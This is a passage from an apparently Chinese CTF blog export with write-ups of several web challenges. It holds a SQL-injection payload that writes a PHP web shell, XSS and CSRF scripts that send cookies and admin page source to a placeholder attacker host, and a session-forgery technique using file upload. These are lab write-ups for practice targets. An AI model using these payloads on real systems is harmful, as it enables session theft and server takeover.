outfile&#39;/app/shell.php&#39;#</code></p>\n<p>但直接写的话进不去，那么hex编码一下，由于是get请求，也url处理一下</p>\n<p><code>-1%27%20union%20select%201,0x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e%20into%20outfile%27/app/blacknight.php%27%23</code></p>\n<p>这里要说一下，开始我写/app/shell.php都不成功，或许是文件存在了写不了？反正自己写个其他的文件名就行了</p>\n<p><img src=\"/images/image-20200620101653615.png\" alt=\"image-20200620101653615\"></p>\n<p>解码全是师傅们的shell，还有个H3re_1s_y0ur_f14g.php</p>\n<p>那么cat读取</p>\n<p><img src=\"/images/image-20200620101831229.png\" alt=\"image-20200620101831229\"></p>\n<h4 id=\"fake-phpminiadmin\"><a href=\"#fake-phpminiadmin\" class=\"headerlink\" title=\"fake phpminiadmin\"></a>fake phpminiadmin</h4><p>sql输入框存在xss，将payload hex编码后可触发</p>\n<p><img src=\"/images/image-20200619232118432.png\" alt=\"image-20200619232118432\"></p>\n<p>提示</p>\n<p><img src=\"/images/image-20200619233403673.png\" alt=\"image-20200619233403673\"></p>\n<p>考点：content处csrf</p>\n<p>拿xss平台的的payload改一下把数据传到自己的ecs上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;(function()&#123;(new Image()).src&#x3D;&#39;http:&#x2F;&#x2F;yourip:yourport&#x2F;index.php?do&#x3D;api&amp;id&#x3D;XI0O1O&amp;location&#x3D;&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation&#x3D;&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;cookie&#x3D;&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;opener&#x3D;&#39;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)());&#125;)();&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>然后貌似可以拿burp生成csrf的payload，以后研究一下，这里直接拿官方的，在ecs上创建一个xss.php，内容如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">  &lt;body&gt;</span><br><span class=\"line\">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class=\"line\">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class=\"line\">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;sql&quot; value&#x3D;&quot;select 0x hex后上述payload&quot; &#x2F;&gt;</span><br><span class=\"line\">    &lt;&#x2F;form&gt;</span><br><span class=\"line\">    &lt;script&gt;document.forms[0].submit();&lt;&#x2F;script&gt;</span><br><span class=\"line\">  &lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>创建好之后在ecs上开启一个python http服务等着</p>\n<p>回到靶机，在content处输入xss.php的请求地址</p>\n<p><img src=\"/images/image-20200620114327075.png\" alt=\"image-20200620114327075\"></p>\n<p>递交需要code，md5之后前六位为75d8be，脚本爆破一下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func</span><span class=\"params\">(md5_val)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">999999</span>, <span class=\"number\">100000000</span>):</span><br><span class=\"line\">        md5_value=hashlib.md5(str(x)).hexdigest()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> md5_value[:<span class=\"number\">6</span>]==md5_val:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> str(x)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    <span class=\"keyword\">print</span> func(<span class=\"string\">'75d8be'</span>)</span><br><span class=\"line\">    //<span class=\"number\">6042761</span></span><br></pre></td></tr></table></figure>\n\n<p>我们递交之后管理员访问content的内容，之后触发构造好的xss并在sql输入框自动提交表单，管理员的cookie等内容就被带出来了。</p>\n<p>提交我们可以看到ecs上已经返回数据了</p>\n<p><img src=\"/images/image-20200620114518271.png\" alt=\"image-20200620114518271\"></p>\n<p>我们可以看到带出了后台地址，这里可以参考<a href=\"https://www.cnblogs.com/afanti/p/8277344.html\" target=\"_blank\" rel=\"noopener\">这位师傅</a>的帖子构造payload获取后台源码</p>\n<p>构造</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createXmlHttp</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">window</span>.XMLHttpRequest) &#123;</span><br><span class=\"line\">        xmlHttp = <span class=\"keyword\">new</span> XMLHttpRequest()</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> MSXML = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>(<span class=\"string\">'MSXML2.XMLHTTP.5.0'</span>, <span class=\"string\">'MSXML2.XMLHTTP.4.0'</span>, <span class=\"string\">'MSXML2.XMLHTTP.3.0'</span>, <span class=\"string\">'MSXML2.XMLHTTP'</span>, <span class=\"string\">'Microsoft.XMLHTTP'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> n = <span class=\"number\">0</span>; n &lt; MSXML.length; n++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                xmlHttp = <span class=\"keyword\">new</span> ActiveXObject(MSXML[n]);</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span>(e) &#123;&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">createXmlHttp();</span><br><span class=\"line\">xmlHttp.onreadystatechange = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (xmlHttp.readyState == <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">        code=<span class=\"built_in\">escape</span>(xmlHttp.responseText);</span><br><span class=\"line\">        createXmlHttp();</span><br><span class=\"line\">        url = <span class=\"string\">\"http://ip:port\"</span>; <span class=\"comment\">//这里是服务器接受的地址</span></span><br><span class=\"line\">        cc = <span class=\"string\">\"htmlcode=\"</span> + code +<span class=\"string\">\"&amp;filename=index.html\"</span>;</span><br><span class=\"line\">        xmlHttp.open(<span class=\"string\">\"POST\"</span>, url, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        xmlHttp.setRequestHeader(<span class=\"string\">\"Content-type\"</span>, <span class=\"string\">\"application/x-www-form-urlencoded\"</span>);</span><br><span class=\"line\">        xmlHttp.setRequestHeader(<span class=\"string\">\"Referer\"</span>, <span class=\"string\">\"http://127.0.0.1/\"</span>);</span><br><span class=\"line\">        xmlHttp.setRequestHeader(<span class=\"string\">\"Cookie\"</span>, <span class=\"string\">\"PHPSESSID=tjuhvnkki74v7qf4lfp41li347\"</span>);</span><br><span class=\"line\">        xmlHttp.send(cc)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">xmlHttp.open(<span class=\"string\">\"GET\"</span>, <span class=\"string\">\"/admin_shark.php\"</span>, <span class=\"literal\">true</span>);<span class=\"comment\">//这块填写获得的后台地址。</span></span><br><span class=\"line\">xmlHttp.setRequestHeader(<span class=\"string\">\"Cookie\"</span>, <span class=\"string\">\"PHPSESSID=tjuhvnkki74v7qf4lfp41li347\"</span>);</span><br><span class=\"line\">xmlHttp.send(<span class=\"literal\">null</span>);<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p>同样hex编码之后放到xss.php中，然后content请求</p>\n<p>这里换成nc监控</p>\n<p><img src=\"/images/image-20200620120034995.png\" alt=\"image-20200620120034995\"></p>\n<p>得到源码以及flag</p>\n<p><img src=\"/images/image-20200620120153097.png\" alt=\"image-20200620120153097\"></p>\n","categories":["CTF"],"tags":["xss","xxe"]},{"title":"HFCTF2020——BabyUpload","url":"/2020/07/04/%5BHFCTF2020%5DBabyUpload/","content":"<p>平台：<a href=\"https://buuoj.cn\" target=\"_blank\" rel=\"noopener\">https://buuoj.cn</a></p>\n<p>打开靶机给出源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">session_save_path(<span class=\"string\">\"/var/babyctf/\"</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">\"/flag\"</span>;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'username'</span>] ===<span class=\"string\">'admin'</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $filename=<span class=\"string\">'/var/babyctf/success.txt'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(file_exists($filename))&#123;</span><br><span class=\"line\">            safe_delete($filename);</span><br><span class=\"line\">            <span class=\"keyword\">die</span>($flag);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    $_SESSION[<span class=\"string\">'username'</span>] =<span class=\"string\">'guest'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$direction = filter_input(INPUT_POST, <span class=\"string\">'direction'</span>);</span><br><span class=\"line\">$attr = filter_input(INPUT_POST, <span class=\"string\">'attr'</span>);</span><br><span class=\"line\">$dir_path = <span class=\"string\">\"/var/babyctf/\"</span>.$attr;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($attr===<span class=\"string\">\"private\"</span>)&#123;</span><br><span class=\"line\">    $dir_path .= <span class=\"string\">\"/\"</span>.$_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($direction === <span class=\"string\">\"upload\"</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!is_uploaded_file($_FILES[<span class=\"string\">'up_file'</span>][<span class=\"string\">'tmp_name'</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">'invalid upload'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $file_path = $dir_path.<span class=\"string\">\"/\"</span>.$_FILES[<span class=\"string\">'up_file'</span>][<span class=\"string\">'name'</span>];</span><br><span class=\"line\">        $file_path .= <span class=\"string\">\"_\"</span>.hash_file(<span class=\"string\">\"sha256\"</span>,$_FILES[<span class=\"string\">'up_file'</span>][<span class=\"string\">'tmp_name'</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/(\\.\\.\\/|\\.\\.\\\\\\\\)/'</span>, $file_path))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">'invalid file path'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        @mkdir($dir_path, <span class=\"number\">0700</span>, <span class=\"keyword\">TRUE</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file($_FILES[<span class=\"string\">'up_file'</span>][<span class=\"string\">'tmp_name'</span>],$file_path))&#123;</span><br><span class=\"line\">            $upload_result = <span class=\"string\">\"uploaded\"</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">'error while saving'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (RuntimeException $e) &#123;</span><br><span class=\"line\">        $upload_result = $e-&gt;getMessage();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">elseif</span> ($direction === <span class=\"string\">\"download\"</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        $filename = basename(filter_input(INPUT_POST, <span class=\"string\">'filename'</span>));</span><br><span class=\"line\">        $file_path = $dir_path.<span class=\"string\">\"/\"</span>.$filename;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/(\\.\\.\\/|\\.\\.\\\\\\\\)/'</span>, $file_path))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">'invalid file path'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!file_exists($file_path)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">'file not exist'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        header(<span class=\"string\">'Content-Type: application/force-download'</span>);</span><br><span class=\"line\">        header(<span class=\"string\">'Content-Length: '</span>.filesize($file_path));</span><br><span class=\"line\">        header(<span class=\"string\">'Content-Disposition: attachment; filename=\"'</span>.substr($filename, <span class=\"number\">0</span>, <span class=\"number\">-65</span>).<span class=\"string\">'\"'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(readfile($file_path))&#123;</span><br><span class=\"line\">            $download_result = <span class=\"string\">\"downloaded\"</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">'error while saving'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (RuntimeException $e) &#123;</span><br><span class=\"line\">        $download_result = $e-&gt;getMessage();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"分析一下\"><a href=\"#分析一下\" class=\"headerlink\" title=\"分析一下\"></a>分析一下</h5><p>前面设置了session存储路径，启动了session并根目录下包含flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">session_save_path(<span class=\"string\">\"/var/babyctf/\"</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">\"/flag\"</span>;</span><br></pre></td></tr></table></figure>\n<p>如果session的username是admin，判断/var/babyctf下是否有success.txt，如果存在，删除文件并输出<code>$flag</code>。<br>否则设置username为guest</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'username'</span>] ===<span class=\"string\">'admin'</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $filename=<span class=\"string\">'/var/babyctf/success.txt'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(file_exists($filename))&#123;</span><br><span class=\"line\">            safe_delete($filename);</span><br><span class=\"line\">            <span class=\"keyword\">die</span>($flag);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    $_SESSION[<span class=\"string\">'username'</span>] =<span class=\"string\">'guest'</span>; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>设置两个post参数direction、attr，<code>$dir_path</code>拼接路径，若<code>$attr</code>为private，在<code>$dir_path</code>的基础上再拼接一个username</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$direction = filter_input(INPUT_POST, <span class=\"string\">'direction'</span>);</span><br><span class=\"line\">$attr = filter_input(INPUT_POST, <span class=\"string\">'attr'</span>); </span><br><span class=\"line\">$dir_path = <span class=\"string\">\"/var/babyctf/\"</span>.$attr;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($attr===<span class=\"string\">\"private\"</span>)&#123;</span><br><span class=\"line\">    $dir_path .= <span class=\"string\">\"/\"</span>.$_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果direction设置为upload，首先判断是否正常上传，通过则在<code>$dir_path</code>下拼接文件名，之后再拼接一个<code>_</code>，同时加上文件名的sha256值，之后限制目录穿越，创建相应目录，把文件上传到目录下。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($direction === <span class=\"string\">\"upload\"</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!is_uploaded_file($_FILES[<span class=\"string\">'up_file'</span>][<span class=\"string\">'tmp_name'</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">'invalid upload'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $file_path = $dir_path.<span class=\"string\">\"/\"</span>.$_FILES[<span class=\"string\">'up_file'</span>][<span class=\"string\">'name'</span>];</span><br><span class=\"line\">        $file_path .= <span class=\"string\">\"_\"</span>.hash_file(<span class=\"string\">\"sha256\"</span>,$_FILES[<span class=\"string\">'up_file'</span>][<span class=\"string\">'tmp_name'</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/(\\.\\.\\/|\\.\\.\\\\\\\\)/'</span>, $file_path))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">'invalid file path'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        @mkdir($dir_path, <span class=\"number\">0700</span>, <span class=\"keyword\">TRUE</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file($_FILES[<span class=\"string\">'up_file'</span>][<span class=\"string\">'tmp_name'</span>],$file_path))&#123;</span><br><span class=\"line\">            $upload_result = <span class=\"string\">\"uploaded\"</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">'error while saving'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (RuntimeException $e) &#123;</span><br><span class=\"line\">        $upload_result = $e-&gt;getMessage();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>若direction设置为download，读取上传上来的文件名，拼接为<code>$file_path</code>，限制目录穿越，判断是否存在，存在则返回文件内容。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">elseif</span> ($direction === <span class=\"string\">\"download\"</span>) &#123;<span class=\"comment\">//如果direction设置为download</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        $filename = basename(filter_input(INPUT_POST, <span class=\"string\">'filename'</span>));</span><br><span class=\"line\">        $file_path = $dir_path.<span class=\"string\">\"/\"</span>.$filename;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/(\\.\\.\\/|\\.\\.\\\\\\\\)/'</span>, $file_path))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">'invalid file path'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!file_exists($file_path)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">'file not exist'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        header(<span class=\"string\">'Content-Type: application/force-download'</span>);</span><br><span class=\"line\">        header(<span class=\"string\">'Content-Length: '</span>.filesize($file_path));</span><br><span class=\"line\">        header(<span class=\"string\">'Content-Disposition: attachment; filename=\"'</span>.substr($filename, <span class=\"number\">0</span>, <span class=\"number\">-65</span>).<span class=\"string\">'\"'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(readfile($file_path))&#123;</span><br><span class=\"line\">            $download_result = <span class=\"string\">\"downloaded\"</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">'error while saving'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (RuntimeException $e) &#123;</span><br><span class=\"line\">        $download_result = $e-&gt;getMessage();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h5 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h5><p>可知要获取flag需满足：</p>\n<blockquote>\n<p>$_SESSION[‘username’] ===’admin’<br>$filename=’/var/babyctf/success.txt’</p>\n</blockquote>\n<p>也就是说我们要伪造自己的username是admin，并创建一个success.txt文件。</p>\n<h6 id=\"伪造session\"><a href=\"#伪造session\" class=\"headerlink\" title=\"伪造session\"></a>伪造session</h6><p>php的session默认存储文件名是sess_+PHPSESSID的值，我们先看一下session文件内容。<br>查看cookie中PHPSESSID<br><img src=\"https://img-blog.csdnimg.cn/20200704135642804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>构造<code>direction=download&amp;attr=&amp;filename=sess_5373dbeb80f6189c95463d7a6c3881a9</code>post传入，在返回内容中读到内容<br><img src=\"https://img-blog.csdnimg.cn/20200704135841854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以看到还有一个不可见字符，参考<a href=\"https://blog.spoock.com/2016/10/16/php-serialize-problem/\" target=\"_blank\" rel=\"noopener\">这位师傅的文章</a>得知，<br>不同的引擎所对应的session的存储方式有</p>\n<blockquote>\n<p>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值<br>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值<br>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</p>\n</blockquote>\n<p>因此我们可以判断这里session处理器为php_binary，那么我们可以在本地利用php_binary生成我们要伪造的session文件。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">ini_set(<span class=\"string\">'session.serialize_handler'</span>, <span class=\"string\">'php_binary'</span>);</span><br><span class=\"line\">session_save_path(<span class=\"string\">\"D:\\\\phpstudy_pro\\\\WWW\\\\testphp\\\\\"</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"></span><br><span class=\"line\">$_SESSION[<span class=\"string\">'username'</span>] = <span class=\"string\">'admin'</span>;</span><br></pre></td></tr></table></figure>\n<p>运行生成session文件<br><img src=\"https://img-blog.csdnimg.cn/20200704141142529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>将文件名改为sess并计算sha256<br><img src=\"https://img-blog.csdnimg.cn/20200704141921228.png\" alt=\"在这里插入图片描述\"><br>这样，如果我们将sess文件上传，服务器储存该文件的文件名就应该是<br><code>sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code><br>用postman将文件传上去<br><img src=\"https://img-blog.csdnimg.cn/20200704143259497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>构造<code>direction=download&amp;attr=&amp;filename=sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code>看是否上传成功<br><img src=\"https://img-blog.csdnimg.cn/2020070414342564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这样就实现了伪造</p>\n<h6 id=\"创建success-txt\"><a href=\"#创建success-txt\" class=\"headerlink\" title=\"创建success.txt\"></a>创建success.txt</h6><p>现在还需要创建一个success.txt来满足判断，回到代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'username'</span>] ===<span class=\"string\">'admin'</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $filename=<span class=\"string\">'/var/babyctf/success.txt'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(file_exists($filename))&#123;</span><br><span class=\"line\">            safe_delete($filename);</span><br><span class=\"line\">            <span class=\"keyword\">die</span>($flag);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>filename是通过file_exists来判断的，而file_exists函数在php中<br><img src=\"https://img-blog.csdnimg.cn/20200704144259520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>文件名设置不了，直接创建目录也符合条件，将<code>attr</code>设置为success.txt创建目录，再将sess上传到该目录下即可绕过判断<br><img src=\"https://img-blog.csdnimg.cn/20200704144630905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以看到已经上传成功<br><img src=\"https://img-blog.csdnimg.cn/2020070414471447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>那么现在我们把PHPSESSID改为sess的文件sha256值让session的username为admin<br><img src=\"https://img-blog.csdnimg.cn/20200704144853695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>再刷新一下即可得到flag<br><img src=\"https://img-blog.csdnimg.cn/20200704144911244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["代码审计","phpsession伪造"]},{"title":"CISCN2019华北赛区Day1_Web1——Dropbox","url":"/2020/06/02/buu10%E2%80%94%E2%80%94%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1%5DDropbox/","content":"<p>平台：buuoj.cn<br>打开靶机注册登录之后是一个管理面板，有上传功能<br><img src=\"https://img-blog.csdnimg.cn/20200602191853312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>上传文件试试看<br><img src=\"https://img-blog.csdnimg.cn/20200602192033417.png\" alt=\"在这里插入图片描述\"><br>可以下载，抓个包有任意文件下载<br><img 